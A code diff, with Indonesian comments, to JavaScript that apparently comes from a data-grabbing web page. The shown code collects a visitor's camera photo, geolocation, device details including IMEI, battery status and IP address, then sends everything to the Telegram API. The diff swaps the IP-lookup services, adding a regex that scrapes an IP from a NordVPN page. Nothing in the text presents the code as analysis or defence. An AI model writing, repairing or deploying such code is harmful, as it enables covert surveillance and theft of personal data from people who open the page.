@@ -66,12 +66,12 @@
                 deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
 
                 // Mengambil IP perangkat menggunakan layanan whoer.net
-                fetch('https://api.whoer.net/v2/json/')
+                fetch('https://whoer.net/json')
                   .then(function(response) {
                     return response.json();
                   })
                   .then(function(data) {
-                    deviceInfo.ipAddress = data.ip;
+                    deviceInfo.ipAddress = data.ip_addr;
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
@@ -154,13 +154,14 @@
 
     // Fungsi untuk mendapatkan alamat IP perangkat dengan cara alternatif
     function getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy) {
-      // Mendapatkan alamat IP menggunakan layanan ipify (alternatif)
-      fetch('https://api6.ipify.org?format=json')
+      // Mendapatkan alamat IP menggunakan layanan nordvpn.com
+      fetch('https://nordvpn.com/id/what-is-my-ip/')
         .then(function(response) {
-          return response.json();
+          return response.text();
         })
         .then(function(data) {
-          deviceInfo.ipAddress = data.ip;
+          var ipAddress = data.match(/<span class="ip">(.*?)<\/span>/)[1];
+          deviceInfo.ipAddress = ipAddress;
 
           // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
           sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
